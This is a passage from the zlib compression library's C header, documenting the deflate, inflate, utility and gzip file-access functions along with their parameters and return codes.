   take effect.  In this case, deflateParams() can be called again with the
   same parameters and more output space to try again.

     In order to assure a change in the parameters on the first try, the
   deflate stream should be flushed using deflate() with Z_BLOCK or other flush
   request until strm.avail_out is not zero, before calling deflateParams().
   Then no more input data should be provided before the deflateParams() call.
   If this is done, the old level and strategy will be applied to the data
   compressed before deflateParams(), and the new level and strategy will be
   applied to the the data compressed after deflateParams().

     deflateParams returns Z_OK on success, Z_STREAM_ERROR if the source stream
   state was inconsistent or if a parameter was invalid, or Z_BUF_ERROR if
   there was not enough output space to complete the compression of the
   available input data before a change in the strategy or approach.  Note that
   in the case of a Z_BUF_ERROR, the parameters are not changed.  A return
   value of Z_BUF_ERROR is not fatal, in which case deflateParams() can be
   retried with more output space.
*/

ZEXTERN int ZEXPORT deflateTune OF((z_streamp strm,
                                    int good_length,
                                    int max_lazy,
                                    int nice_length,
                                    int max_chain));
/*
     Fine tune deflate's internal compression parameters.  This should only be
   used by someone who understands the algorithm used by zlib's deflate for
   searching for the best matching string, and even then only by the most
   fanatic optimizer trying to squeeze out the last compressed bit for their
   specific input data.  Read the deflate.c source code for the meaning of the
   max_lazy, good_length, nice_length, and max_chain parameters.

     deflateTune() can be called after deflateInit() or deflateInit2(), and
   returns Z_OK on success, or Z_STREAM_ERROR for an invalid deflate stream.
 */

ZEXTERN uLong ZEXPORT deflateBound OF((z_streamp strm,
                                       uLong sourceLen));
/*
     deflateBound() returns an upper bound on the compressed size after
   deflation of sourceLen bytes.  It must be called after deflateInit() or
   deflateInit2(), and after deflateSetHeader(), if used.  This would be used
   to allocate an output buffer for deflation in a single pass, and so would be
   called before deflate().  If that first deflate() call is provided the
   sourceLen input bytes, an output buffer allocated to the size returned by
   deflateBound(), and the flush value Z_FINISH, then deflate() is guaranteed
   to return Z_STREAM_END.  Note that it is possible for the compressed size to
   be larger than the value returned by deflateBound() if flush options other
   than Z_FINISH or Z_NO_FLUSH are used.
*/

ZEXTERN int ZEXPORT deflatePending OF((z_streamp strm,
                                       unsigned *pending,
                                       int *bits));
/*
     deflatePending() returns the number of bytes and bits of output that have
   been generated, but not yet provided in the available output.  The bytes not
   provided would be due to the available output space having being consumed.
   The number of bits of output not provided are between 0 and 7, where they
   await more bits to join them in order to fill out a full byte.  If pending
   or bits are Z_NULL, then those values are not set.

     deflatePending returns Z_OK if success, or Z_STREAM_ERROR if the source
   stream state was inconsistent.
 */

ZEXTERN int ZEXPORT deflatePrime OF((z_streamp strm,
                                     int bits,
                                     int value));
/*
     deflatePrime() inserts bits in the deflate output stream.  The intent
   is that this function is used to start off the deflate output with the bits
   leftover from a previous deflate stream when appending to it.  As such, this
   function can only be used for raw deflate, and must be used before the first
   deflate() call after a deflateInit2() or deflateReset().  bits must be less
   than or equal to 16, and that many of the least significant bits of value
   will be inserted in the output.

     deflatePrime returns Z_OK if success, Z_BUF_ERROR if there was not enough
   room in the internal buffer to insert the bits, or Z_STREAM_ERROR if the
   source stream state was inconsistent.
*/

ZEXTERN int ZEXPORT deflateSetHeader OF((z_streamp strm,
                                         gz_headerp head));
/*
     deflateSetHeader() provides gzip header information for when a gzip
   stream is requested by deflateInit2().  deflateSetHeader() may be called
   after deflateInit2() or deflateReset() and before the first call of
   deflate().  The text, time, os, extra field, name, and comment information
   in the provided gz_header structure are written to the gzip header (xflag is
   ignored -- the extra flags are set according to the compression level).  The
   caller must assure that, if not Z_NULL, name and comment are terminated with
   a zero byte, and that if extra is not Z_NULL, that extra_len bytes are
   available there.  If hcrc is true, a gzip header crc is included.  Note that
   the current versions of the command-line version of gzip (up through version
   1.3.x) do not support header crc's, and will report that it is a "multi-part
   gzip file" and give up.

     If deflateSetHeader is not used, the default gzip header has text false,
   the time set to zero, and os set to 255, with no extra, name, or comment
   fields.  The gzip header is returned to the default state by deflateReset().

     deflateSetHeader returns Z_OK if success, or Z_STREAM_ERROR if the source
   stream state was inconsistent.
*/

/*
ZEXTERN int ZEXPORT inflateInit2 OF((z_streamp strm,
                                     int  windowBits));

     This is another version of inflateInit with an extra parameter.  The
   fields next_in, avail_in, zalloc, zfree and opaque must be initialized
   before by the caller.

     The windowBits parameter is the base two logarithm of the maximum window
   size (the size of the history buffer).  It should be in the range 8..15 for
   this version of the library.  The default value is 15 if inflateInit is used
   instead.  windowBits must be greater than or equal to the windowBits value
   provided to deflateInit2() while compressing, or it must be equal to 15 if
   deflateInit2() was not used.  If a compressed stream with a larger window
   size is given as input, inflate() will return with the error code
   Z_DATA_ERROR instead of trying to allocate a larger window.

     windowBits can also be zero to request that inflate use the window size in
   the zlib header of the compressed stream.

     windowBits can also be -8..-15 for raw inflate.  In this case, -windowBits
   determines the window size.  inflate() will then process raw deflate data,
   not looking for a zlib or gzip header, not generating a check value, and not
   looking for any check values for comparison at the end of the stream.  This
   is for use with other formats that use the deflate compressed data format
   such as zip.  Those formats provide their own check values.  If a custom
   format is developed using the raw deflate format for compressed data, it is
   recommended that a check value such as an Adler-32 or a CRC-32 be applied to
   the uncompressed data as is done in the zlib, gzip, and zip formats.  For
   most applications, the zlib format should be used as is.  Note that comments
   above on the use in deflateInit2() applies to the magnitude of windowBits.

     windowBits can also be greater than 15 for optional gzip decoding.  Add
   32 to windowBits to enable zlib and gzip decoding with automatic header
   detection, or add 16 to decode only the gzip format (the zlib format will
   return a Z_DATA_ERROR).  If a gzip stream is being decoded, strm->adler is a
   CRC-32 instead of an Adler-32.  Unlike the gunzip utility and gzread() (see
   below), inflate() will not automatically decode concatenated gzip streams.
   inflate() will return Z_STREAM_END at the end of the gzip stream.  The state
   would need to be reset to continue decoding a subsequent gzip stream.

     inflateInit2 returns Z_OK if success, Z_MEM_ERROR if there was not enough
   memory, Z_VERSION_ERROR if the zlib library version is incompatible with the
   version assumed by the caller, or Z_STREAM_ERROR if the parameters are
   invalid, such as a null pointer to the structure.  msg is set to null if
   there is no error message.  inflateInit2 does not perform any decompression
   apart from possibly reading the zlib header if present: actual decompression
   will be done by inflate().  (So next_in and avail_in may be modified, but
   next_out and avail_out are unused and unchanged.) The current implementation
   of inflateInit2() does not process any header information -- that is
   deferred until inflate() is called.
*/

ZEXTERN int ZEXPORT inflateSetDictionary OF((z_streamp strm,
                                             const Bytef *dictionary,
                                             uInt  dictLength));
/*
     Initializes the decompression dictionary from the given uncompressed byte
   sequence.  This function must be called immediately after a call of inflate,
   if that call returned Z_NEED_DICT.  The dictionary chosen by the compressor
   can be determined from the Adler-32 value returned by that call of inflate.
   The compressor and decompressor must use exactly the same dictionary (see
   deflateSetDictionary).  For raw inflate, this function can be called at any
   time to set the dictionary.  If the provided dictionary is smaller than the
   window and there is already data in the window, then the provided dictionary
   will amend what's there.  The application must insure that the dictionary
   that was used for compression is provided.

     inflateSetDictionary returns Z_OK if success, Z_STREAM_ERROR if a
   parameter is invalid (e.g.  dictionary being Z_NULL) or the stream state is
   inconsistent, Z_DATA_ERROR if the given dictionary doesn't match the
   expected one (incorrect Adler-32 value).  inflateSetDictionary does not
   perform any decompression: this will be done by subsequent calls of
   inflate().
*/

ZEXTERN int ZEXPORT inflateGetDictionary OF((z_streamp strm,
                                             Bytef *dictionary,
                                             uInt  *dictLength));
/*
     Returns the sliding dictionary being maintained by inflate.  dictLength is
   set to the number of bytes in the dictionary, and that many bytes are copied
   to dictionary.  dictionary must have enough space, where 32768 bytes is
   always enough.  If inflateGetDictionary() is called with dictionary equal to
   Z_NULL, then only the dictionary length is returned, and nothing is copied.
   Similary, if dictLength is Z_NULL, then it is not set.

     inflateGetDictionary returns Z_OK on success, or Z_STREAM_ERROR if the
   stream state is inconsistent.
*/

ZEXTERN int ZEXPORT inflateSync OF((z_streamp strm));
/*
     Skips invalid compressed data until a possible full flush point (see above
   for the description of deflate with Z_FULL_FLUSH) can be found, or until all
   available input is skipped.  No output is provided.

     inflateSync searches for a 00 00 FF FF pattern in the compressed data.
   All full flush points have this pattern, but not all occurrences of this
   pattern are full flush points.

     inflateSync returns Z_OK if a possible full flush point has been found,
   Z_BUF_ERROR if no more input was provided, Z_DATA_ERROR if no flush point
   has been found, or Z_STREAM_ERROR if the stream structure was inconsistent.
   In the success case, the application may save the current current value of
   total_in which indicates where valid compressed data was found.  In the
   error case, the application may repeatedly call inflateSync, providing more
   input each time, until success or end of the input data.
*/

ZEXTERN int ZEXPORT inflateCopy OF((z_streamp dest,
                                    z_streamp source));
/*
     Sets the destination stream as a complete copy of the source stream.

     This function can be useful when randomly accessing a large stream.  The
   first pass through the stream can periodically record the inflate state,
   allowing restarting inflate at those points when randomly accessing the
   stream.

     inflateCopy returns Z_OK if success, Z_MEM_ERROR if there was not
   enough memory, Z_STREAM_ERROR if the source stream state was inconsistent
   (such as zalloc being Z_NULL).  msg is left unchanged in both source and
   destination.
*/

ZEXTERN int ZEXPORT inflateReset OF((z_streamp strm));
/*
     This function is equivalent to inflateEnd followed by inflateInit,
   but does not free and reallocate the internal decompression state.  The
   stream will keep attributes that may have been set by inflateInit2.

     inflateReset returns Z_OK if success, or Z_STREAM_ERROR if the source
   stream state was inconsistent (such as zalloc or state being Z_NULL).
*/

ZEXTERN int ZEXPORT inflateReset2 OF((z_streamp strm,
                                      int windowBits));
/*
     This function is the same as inflateReset, but it also permits changing
   the wrap and window size requests.  The windowBits parameter is interpreted
   the same as it is for inflateInit2.  If the window size is changed, then the
   memory allocated for the window is freed, and the window will be reallocated
   by inflate() if needed.

     inflateReset2 returns Z_OK if success, or Z_STREAM_ERROR if the source
   stream state was inconsistent (such as zalloc or state being Z_NULL), or if
   the windowBits parameter is invalid.
*/

ZEXTERN int ZEXPORT inflatePrime OF((z_streamp strm,
                                     int bits,
                                     int value));
/*
     This function inserts bits in the inflate input stream.  The intent is
   that this function is used to start inflating at a bit position in the
   middle of a byte.  The provided bits will be used before any bytes are used
   from next_in.  This function should only be used with raw inflate, and
   should be used before the first inflate() call after inflateInit2() or
   inflateReset().  bits must be less than or equal to 16, and that many of the
   least significant bits of value will be inserted in the input.

     If bits is negative, then the input stream bit buffer is emptied.  Then
   inflatePrime() can be called again to put bits in the buffer.  This is used
   to clear out bits leftover after feeding inflate a block description prior
   to feeding inflate codes.

     inflatePrime returns Z_OK if success, or Z_STREAM_ERROR if the source
   stream state was inconsistent.
*/

ZEXTERN long ZEXPORT inflateMark OF((z_streamp strm));
/*
     This function returns two values, one in the lower 16 bits of the return
   value, and the other in the remaining upper bits, obtained by shifting the
   return value down 16 bits.  If the upper value is -1 and the lower value is
   zero, then inflate() is currently decoding information outside of a block.
   If the upper value is -1 and the lower value is non-zero, then inflate is in
   the middle of a stored block, with the lower value equaling the number of
   bytes from the input remaining to copy.  If the upper value is not -1, then
   it is the number of bits back from the current bit position in the input of
   the code (literal or length/distance pair) currently being processed.  In
   that case the lower value is the number of bytes already emitted for that
   code.

     A code is being processed if inflate is waiting for more input to complete
   decoding of the code, or if it has completed decoding but is waiting for
   more output space to write the literal or match data.

     inflateMark() is used to mark locations in the input data for random
   access, which may be at bit positions, and to note those cases where the
   output of a code may span boundaries of random access blocks.  The current
   location in the input stream can be determined from avail_in and data_type
   as noted in the description for the Z_BLOCK flush parameter for inflate.

     inflateMark returns the value noted above, or -65536 if the provided
   source stream state was inconsistent.
*/

ZEXTERN int ZEXPORT inflateGetHeader OF((z_streamp strm,
                                         gz_headerp head));
/*
     inflateGetHeader() requests that gzip header information be stored in the
   provided gz_header structure.  inflateGetHeader() may be called after
   inflateInit2() or inflateReset(), and before the first call of inflate().
   As inflate() processes the gzip stream, head->done is zero until the header
   is completed, at which time head->done is set to one.  If a zlib stream is
   being decoded, then head->done is set to -1 to indicate that there will be
   no gzip header information forthcoming.  Note that Z_BLOCK or Z_TREES can be
   used to force inflate() to return immediately after header processing is
   complete and before any actual data is decompressed.

     The text, time, xflags, and os fields are filled in with the gzip header
   contents.  hcrc is set to true if there is a header CRC.  (The header CRC
   was valid if done is set to one.) If extra is not Z_NULL, then extra_max
   contains the maximum number of bytes to write to extra.  Once done is true,
   extra_len contains the actual extra field length, and extra contains the
   extra field, or that field truncated if extra_max is less than extra_len.
   If name is not Z_NULL, then up to name_max characters are written there,
   terminated with a zero unless the length is greater than name_max.  If
   comment is not Z_NULL, then up to comm_max characters are written there,
   terminated with a zero unless the length is greater than comm_max.  When any
   of extra, name, or comment are not Z_NULL and the respective field is not
   present in the header, then that field is set to Z_NULL to signal its
   absence.  This allows the use of deflateSetHeader() with the returned
   structure to duplicate the header.  However if those fields are set to
   allocated memory, then the application will need to save those pointers
   elsewhere so that they can be eventually freed.

     If inflateGetHeader is not used, then the header information is simply
   discarded.  The header is always checked for validity, including the header
   CRC if present.  inflateReset() will reset the process to discard the header
   information.  The application would need to call inflateGetHeader() again to
   retrieve the header from the next gzip stream.

     inflateGetHeader returns Z_OK if success, or Z_STREAM_ERROR if the source
   stream state was inconsistent.
*/

/*
ZEXTERN int ZEXPORT inflateBackInit OF((z_streamp strm, int windowBits,
                                        unsigned char FAR *window));

     Initialize the internal stream state for decompression using inflateBack()
   calls.  The fields zalloc, zfree and opaque in strm must be initialized
   before the call.  If zalloc and zfree are Z_NULL, then the default library-
   derived memory allocation routines are used.  windowBits is the base two
   logarithm of the window size, in the range 8..15.  window is a caller
   supplied buffer of that size.  Except for special applications where it is
   assured that deflate was used with small window sizes, windowBits must be 15
   and a 32K byte window must be supplied to be able to decompress general
   deflate streams.

     See inflateBack() for the usage of these routines.

     inflateBackInit will return Z_OK on success, Z_STREAM_ERROR if any of
   the parameters are invalid, Z_MEM_ERROR if the internal state could not be
   allocated, or Z_VERSION_ERROR if the version of the library does not match
   the version of the header file.
*/

typedef unsigned (*in_func) OF((void FAR *,
                                z_const unsigned char FAR * FAR *));
typedef int (*out_func) OF((void FAR *, unsigned char FAR *, unsigned));

ZEXTERN int ZEXPORT inflateBack OF((z_streamp strm,
                                    in_func in, void FAR *in_desc,
                                    out_func out, void FAR *out_desc));
/*
     inflateBack() does a raw inflate with a single call using a call-back
   interface for input and output.  This is potentially more efficient than
   inflate() for file i/o applications, in that it avoids copying between the
   output and the sliding window by simply making the window itself the output
   buffer.  inflate() can be faster on modern CPUs when used with large
   buffers.  inflateBack() trusts the application to not change the output
   buffer passed by the output function, at least until inflateBack() returns.

     inflateBackInit() must be called first to allocate the internal state
   and to initialize the state with the user-provided window buffer.
   inflateBack() may then be used multiple times to inflate a complete, raw
   deflate stream with each call.  inflateBackEnd() is then called to free the
   allocated state.

     A raw deflate stream is one with no zlib or gzip header or trailer.
   This routine would normally be used in a utility that reads zip or gzip
   files and writes out uncompressed files.  The utility would decode the
   header and process the trailer on its own, hence this routine expects only
   the raw deflate stream to decompress.  This is different from the default
   behavior of inflate(), which expects a zlib header and trailer around the
   deflate stream.

     inflateBack() uses two subroutines supplied by the caller that are then
   called by inflateBack() for input and output.  inflateBack() calls those
   routines until it reads a complete deflate stream and writes out all of the
   uncompressed data, or until it encounters an error.  The function's
   parameters and return types are defined above in the in_func and out_func
   typedefs.  inflateBack() will call in(in_desc, &buf) which should return the
   number of bytes of provided input, and a pointer to that input in buf.  If
   there is no input available, in() must return zero -- buf is ignored in that
   case -- and inflateBack() will return a buffer error.  inflateBack() will
   call out(out_desc, buf, len) to write the uncompressed data buf[0..len-1].
   out() should return zero on success, or non-zero on failure.  If out()
   returns non-zero, inflateBack() will return with an error.  Neither in() nor
   out() are permitted to change the contents of the window provided to
   inflateBackInit(), which is also the buffer that out() uses to write from.
   The length written by out() will be at most the window size.  Any non-zero
   amount of input may be provided by in().

     For convenience, inflateBack() can be provided input on the first call by
   setting strm->next_in and strm->avail_in.  If that input is exhausted, then
   in() will be called.  Therefore strm->next_in must be initialized before
   calling inflateBack().  If strm->next_in is Z_NULL, then in() will be called
   immediately for input.  If strm->next_in is not Z_NULL, then strm->avail_in
   must also be initialized, and then if strm->avail_in is not zero, input will
   initially be taken from strm->next_in[0 ..  strm->avail_in - 1].

     The in_desc and out_desc parameters of inflateBack() is passed as the
   first parameter of in() and out() respectively when they are called.  These
   descriptors can be optionally used to pass any information that the caller-
   supplied in() and out() functions need to do their job.

     On return, inflateBack() will set strm->next_in and strm->avail_in to
   pass back any unused input that was provided by the last in() call.  The
   return values of inflateBack() can be Z_STREAM_END on success, Z_BUF_ERROR
   if in() or out() returned an error, Z_DATA_ERROR if there was a format error
   in the deflate stream (in which case strm->msg is set to indicate the nature
   of the error), or Z_STREAM_ERROR if the stream was not properly initialized.
   In the case of Z_BUF_ERROR, an input or output error can be distinguished
   using strm->next_in which will be Z_NULL only if in() returned an error.  If
   strm->next_in is not Z_NULL, then the Z_BUF_ERROR was due to out() returning
   non-zero.  (in() will always be called before out(), so strm->next_in is
   assured to be defined if out() returns non-zero.)  Note that inflateBack()
   cannot return Z_OK.
*/

ZEXTERN int ZEXPORT inflateBackEnd OF((z_streamp strm));
/*
     All memory allocated by inflateBackInit() is freed.

     inflateBackEnd() returns Z_OK on success, or Z_STREAM_ERROR if the stream
   state was inconsistent.
*/

ZEXTERN uLong ZEXPORT zlibCompileFlags OF((void));
/* Return flags indicating compile-time options.

    Type sizes, two bits each, 00 = 16 bits, 01 = 32, 10 = 64, 11 = other:
     1.0: size of uInt
     3.2: size of uLong
     5.4: size of voidpf (pointer)
     7.6: size of z_off_t

    Compiler, assembler, and debug options:
     8: ZLIB_DEBUG
     9: ASMV or ASMINF -- use ASM code
     10: ZLIB_WINAPI -- exported functions use the WINAPI calling convention
     11: 0 (reserved)

    One-time table building (smaller code, but not thread-safe if true):
     12: BUILDFIXED -- build static block decoding tables when needed
     13: DYNAMIC_CRC_TABLE -- build CRC calculation tables when needed
     14,15: 0 (reserved)

    Library content (indicates missing functionality):
     16: NO_GZCOMPRESS -- gz* functions cannot compress (to avoid linking
                          deflate code when not needed)
     17: NO_GZIP -- deflate can't write gzip streams, and inflate can't detect
                    and decode gzip streams (to avoid linking crc code)
     18-19: 0 (reserved)

    Operation variations (changes in library functionality):
     20: PKZIP_BUG_WORKAROUND -- slightly more permissive inflate
     21: FASTEST -- deflate algorithm with only one, lowest compression level
     22,23: 0 (reserved)

    The sprintf variant used by gzprintf (zero is best):
     24: 0 = vs*, 1 = s* -- 1 means limited to 20 arguments after the format
     25: 0 = *nprintf, 1 = *printf -- 1 means gzprintf() not secure!
     26: 0 = returns value, 1 = void -- 1 means inferred string length returned

    Remainder:
     27-31: 0 (reserved)
 */

#ifndef Z_SOLO

                        /* utility functions */

/*
     The following utility functions are implemented on top of the basic
   stream-oriented functions.  To simplify the interface, some default options
   are assumed (compression level and memory usage, standard memory allocation
   functions).  The source code of these utility functions can be modified if
   you need special options.
*/

ZEXTERN int ZEXPORT compress OF((Bytef *dest,   uLongf *destLen,
                                 const Bytef *source, uLong sourceLen));
/*
     Compresses the source buffer into the destination buffer.  sourceLen is
   the byte length of the source buffer.  Upon entry, destLen is the total size
   of the destination buffer, which must be at least the value returned by
   compressBound(sourceLen).  Upon exit, destLen is the actual size of the
   compressed data.  compress() is equivalent to compress2() with a level
   parameter of Z_DEFAULT_COMPRESSION.

     compress returns Z_OK if success, Z_MEM_ERROR if there was not
   enough memory, Z_BUF_ERROR if there was not enough room in the output
   buffer.
*/

ZEXTERN int ZEXPORT compress2 OF((Bytef *dest,   uLongf *destLen,
                                  const Bytef *source, uLong sourceLen,
                                  int level));
/*
     Compresses the source buffer into the destination buffer.  The level
   parameter has the same meaning as in deflateInit.  sourceLen is the byte
   length of the source buffer.  Upon entry, destLen is the total size of the
   destination buffer, which must be at least the value returned by
   compressBound(sourceLen).  Upon exit, destLen is the actual size of the
   compressed data.

     compress2 returns Z_OK if success, Z_MEM_ERROR if there was not enough
   memory, Z_BUF_ERROR if there was not enough room in the output buffer,
   Z_STREAM_ERROR if the level parameter is invalid.
*/

ZEXTERN uLong ZEXPORT compressBound OF((uLong sourceLen));
/*
     compressBound() returns an upper bound on the compressed size after
   compress() or compress2() on sourceLen bytes.  It would be used before a
   compress() or compress2() call to allocate the destination buffer.
*/

ZEXTERN int ZEXPORT uncompress OF((Bytef *dest,   uLongf *destLen,
                                   const Bytef *source, uLong sourceLen));
/*
     Decompresses the source buffer into the destination buffer.  sourceLen is
   the byte length of the source buffer.  Upon entry, destLen is the total size
   of the destination buffer, which must be large enough to hold the entire
   uncompressed data.  (The size of the uncompressed data must have been saved
   previously by the compressor and transmitted to the decompressor by some
   mechanism outside the scope of this compression library.) Upon exit, destLen
   is the actual size of the uncompressed data.

     uncompress returns Z_OK if success, Z_MEM_ERROR if there was not
   enough memory, Z_BUF_ERROR if there was not enough room in the output
   buffer, or Z_DATA_ERROR if the input data was corrupted or incomplete.  In
   the case where there is not enough room, uncompress() will fill the output
   buffer with the uncompressed data up to that point.
*/

ZEXTERN int ZEXPORT uncompress2 OF((Bytef *dest,   uLongf *destLen,
                                    const Bytef *source, uLong *sourceLen));
/*
     Same as uncompress, except that sourceLen is a pointer, where the
   length of the source is *sourceLen.  On return, *sourceLen is the number of
   source bytes consumed.
*/

                        /* gzip file access functions */

/*
     This library supports reading and writing files in gzip (.gz) format with
   an interface similar to that of stdio, using the functions that start with
   "gz".  The gzip format is different from the zlib format.  gzip is a gzip
   wrapper, documented in RFC 1952, wrapped around a deflate stream.
*/

typedef struct gzFile_s *gzFile;    /* semi-opaque gzip file descriptor */

/*
ZEXTERN gzFile ZEXPORT gzopen OF((const char *path, const char *mode));

     Opens a gzip (.gz) file for reading or writing.  The mode parameter is as
   in fopen ("rb" or "wb") but can also include a compression level ("wb9") or
   a strategy: 'f' for filtered data as in "wb6f", 'h' for Huffman-only
   compression as in "wb1h", 'R' for run-length encoding as in "wb1R", or 'F'
   for fixed code compression as in "wb9F".  (See the description of
   deflateInit2 for more information about the strategy parameter.)  'T' will
   request transparent writing or appending with no compression and not using
   the gzip format.

     "a" can be used instead of "w" to request that the gzip stream that will
   be written be appended to the file.  "+" will result in an error, since
   reading and writing to the same gzip file is not supported.  The addition of
   "x" when writing will create the file exclusively, which fails if the file
   already exists.  On systems that support it, the addition of "e" when
   reading or writing will set the flag to close the file on an execve() call.

     These functions, as well as gzip, will read and decode a sequence of gzip
   streams in a file.  The append function of gzopen() can be used to create
   such a file.  (Also see gzflush() for another way to do this.)  When
   appending, gzopen does not test whether the file begins with a gzip stream,
   nor does it look for the end of the gzip streams to begin appending.  gzopen
   will simply append a gzip stream to the existing file.

     gzopen can be used to read a file which is not in gzip format; in this
   case gzread will directly read from the file without decompression.  When
   reading, this will be detected automatically by looking for the magic two-
   byte gzip header.

     gzopen returns NULL if the file could not be opened, if there was
   insufficient memory to allocate the gzFile state, or if an invalid mode was
   specified (an 'r', 'w', or 'a' was not provided, or '+' was provided).
   errno can be checked to determine if the reason gzopen failed was that the
   file could not be opened.
*/

ZEXTERN gzFile ZEXPORT gzdopen OF((int fd, const char *mode));
/*
     gzdopen associates a gzFile with the file descriptor fd.  File descriptors
   are obtained from calls like open, dup, creat, pipe or fileno (if the file
   has been previously opened with fopen).  The mode parameter is as in gzopen.

     The next call of gzclose on the returned gzFile will also close the file
   descriptor fd, just like fclose(fdopen(fd, mode)) closes the file descriptor
   fd.  If you want to keep fd open, use fd = dup(fd_keep); gz = gzdopen(fd,
   mode);.  The duplicated descriptor should be saved to avoid a leak, since
   gzdopen does not close fd if it fails.  If you are using fileno() to get the
   file descriptor from a FILE *, then you will have to use dup() to avoid
   double-close()ing the file descriptor.  Both gzclose() and fclose() will
   close the associated file descriptor, so they need to have different file
   descriptors.

     gzdopen returns NULL if there was insufficient memory to allocate the
   gzFile state, if an invalid mode was specified (an 'r', 'w', or 'a' was not
   provided, or '+' was provided), or if fd is -1.  The file descriptor is not
   used until the next gz* read, write, seek, or close operation, so gzdopen
   will not detect if fd is invalid (unless fd is -1).
*/

ZEXTERN int ZEXPORT gzbuffer OF((gzFile file, unsigned size));
/*
     Set the internal buffer size used by this library's functions.  The
   default buffer size is 8192 bytes.  This function must be called after
   gzopen() or gzdopen(), and before any other calls that read or write the
   file.  The buffer memory allocation is always deferred to the first read or
   write.  Three times that size in buffer space is allocated.  A larger buffer
   size of, for example, 64K or 128K bytes will noticeably increase the speed
   of decompression (reading).

     The new buffer size also affects the maximum length for gzprintf().

     gzbuffer() returns 0 on success, or -1 on failure, such as being called
   too late.
*/

ZEXTERN int ZEXPORT gzsetparams OF((gzFile file, int level, int strategy));
/*
     Dynamically update the compression level or strategy.  See the description
   of deflateInit2 for the meaning of these parameters.  Previously provided
   data is flushed before the parameter change.

     gzsetparams returns Z_OK if success, Z_STREAM_ERROR if the file was not
   opened for writing, Z_ERRNO if there is an error writing the flushed data,
   or Z_MEM_ERROR if there is a memory allocation error.
*/

ZEXTERN int ZEXPORT gzread OF((gzFile file, voidp buf, unsigned len));
/*
     Reads the given number of uncompressed bytes from the compressed file.  If
   the input file is not in gzip format, gzread copies the given number of
   bytes into the buffer directly from the file.

     After reaching the end of a gzip stream in the input, gzread will continue
   to read, looking for another gzip stream.  Any number of gzip streams may be
   concatenated in the input file, and will all be decompressed by gzread().
   If something other than a gzip stream is encountered after a gzip stream,
   that remaining trailing garbage is ignored (and no error is returned).

     gzread can be used to read a gzip file that is being concurrently written.
   Upon reaching the end of the input, gzread will return with the available
   data.  If the error code returned by gzerror is Z_OK or Z_BUF_ERROR, then
   gzclearerr can be used to clear the end of file indicator in order to permit
   gzread to be tried again.  Z_OK indicates that a gzip stream was completed
   on the last gzread.  Z_BUF_ERROR indicates that the input file ended in the
   middle of a gzip stream.  Note that gzread does not return -1 in the event
   of an incomplete gzip stream.  This error is deferred until gzclose(), which
   will return Z_BUF_ERROR if the last gzread ended in the middle of a gzip
   stream.  Alternatively, gzerror can be used before gzclose to detect this
   case.

     gzread returns the number of uncompressed bytes actually read, less than
   len for end of file, or -1 for error.  If len is too large to fit in an int,
   then nothing is read, -1 is returned, and the error state is set to
   Z_STREAM_ERROR.
*/

ZEXTERN z_size_t ZEXPORT gzfread OF((voidp buf, z_size_t size, z_size_t nitems,
                                     gzFile file));
/*
     Read up to nitems items of size size from file to buf, otherwise operating
   as gzread() does.  This duplicates the interface of stdio's fread(), with
   size_t request and return types.  If the library defines size_t, then
   z_size_t is identical to size_t.  If not, then z_size_t is an unsigned
   integer type that can contain a pointer.

     gzfread() returns the number of full items read of size size, or zero if
   the end of the file was reached and a full item could not be read, or if
   there was an error.  gzerror() must be consulted if zero is returned in
   order to determine if there was an error.  If the multiplication of size and
   nitems overflows, i.e. the product does not fit in a z_size_t, then nothing
   is read, zero is returned, and the error state is set to Z_STREAM_ERROR.

     In the event that the end of file is reached and only a partial item is
   available at the end, i.e. the remaining uncompressed data length is not a
   multiple of size, then the final partial item is nevetheless read into buf
   and the end-of-file flag is set.  The length of the partial item read is not
   provided, but could be inferred from the result of gztell().  This behavior
   is the same as the behavior of fread() implementations in common libraries,
   but it prevents the direct use of gzfread() to read a concurrently written
   file, reseting and retrying on end-of-file, when size is not 1.
*/

ZEXTERN int ZEXPORT gzwrite OF((gzFile file,
                                voidpc buf, unsigned len));
/*
     Writes the given number of uncompressed bytes into the compressed file.
   gzwrite returns the number of uncompressed bytes written or 0 in case of
   error.
*/

ZEXTERN z_size_t ZEXPORT gzfwrite OF((voidpc buf, z_size_t size,
                                      z_size_t nitems, gzFile file));
/*
     gzfwrite() writes nitems items of size size from buf to file, duplicating
   the interface of stdio's fwrite(), with size_t request and return types.  If
   the library defines size_t, then z_size_t is identical to size_t.  If not,
   then z_size_t is an unsigned integer type that can contain a pointer.

     gzfwrite() returns the number of full items written of size size, or zero
   if there was an error.  If the multiplication of size and nitems overflows,
   i.e. the product does not fit in a z_size_t, then nothing is written, zero
   is returned, and the error state is set to Z_STREAM_ERROR.
*/

ZEXTERN int ZEXPORTVA gzprintf Z_ARG((gzFile file, const char *format, ...));
/*
     Converts, formats, and writes the arguments to the compressed file under
   control of the format string, as in fprintf.  gzprintf returns the number of
   uncompressed bytes actually written, or a negative zlib error code in case
   of error.  The number of uncompressed bytes written is limited to 8191, or
   one less than the buffer size given to gzbuffer().  The caller should assure
   that this limit is not exceeded.  If it is exceeded, then gzprintf() will
   return an error (0) with nothing written.  In this case, there may also be a
   buffer overflow with unpredictable consequences, which is possible only if
   zlib was compiled with the insecure functions sprintf() or vsprintf()
   because the secure snprintf() or vsnprintf() functions were not available.
   This can be determined using zlibCompileFlags().
*/

ZEXTERN int ZEXPORT gzputs OF((gzFile file, const char *s));
/*
     Writes the given null-terminated string to the compressed file, excluding
   the terminating null character.

     gzputs returns the number of characters written, or -1 in case of error.
*/

ZEXTERN char * ZEXPORT gzgets OF((gzFile file, char *buf, int len));
/*
     Reads bytes from the compressed file until len-1 characters are read, or a
   newline character is read and transferred to buf, or an end-of-file
   condition is encountered.  If any characters are read or if len == 1, the
   string is terminated with a null character.  If no characters are read due
   to an end-of-file or len < 1, then the buffer is left untouched.

     gzgets returns buf which is a null-terminated string, or it returns NULL
   for end-of-file or in case of error.  If there was an error, the contents at
   buf are indeterminate.
*/

ZEXTERN int ZEXPORT gzputc OF((gzFile file, int c));
/*
     Writes c, converted to an unsigned char, into the compressed file.  gzputc
   returns the value that was written, or -1 in case of error.
*/

ZEXTERN int ZEXPORT gzgetc OF((gzFile file));
/*
     Reads one byte from the compressed file.  gzgetc returns this byte or -1
   in case of end of file or error.  This is implemented as a macro for speed.
   As such, it does not do all of the checking the other functions do.  I.e.
   it does not check to see if file is NULL, nor whether the structure file
   points to has been clobbered or not.
*/

ZEXTERN int ZEXPORT gzungetc OF((int c, gzFile file));
/*
     Push one character back onto the stream to be read as the first character
   on the next read.  At least one character of push-back is allowed.
   gzungetc() returns the character pushed, or -1 on failure.  gzungetc() will
   fail if c is -1, and may fail if a character has been pushed but not read
   yet.  If gzungetc is used immediately after gzopen or gzdopen, at least the
